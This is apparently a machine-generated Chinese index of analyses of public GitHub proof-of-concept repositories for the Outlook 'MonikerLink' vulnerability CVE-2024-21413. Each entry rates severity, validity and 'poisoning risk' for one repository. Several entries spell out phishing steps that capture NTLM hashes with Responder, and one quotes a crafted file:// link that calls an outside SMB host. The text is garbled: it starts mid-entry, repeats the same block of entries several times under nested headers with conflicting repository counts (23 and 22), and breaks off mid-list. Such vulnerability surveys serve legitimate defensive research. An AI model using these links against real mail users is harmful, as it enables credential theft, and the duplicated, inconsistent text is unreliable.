提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
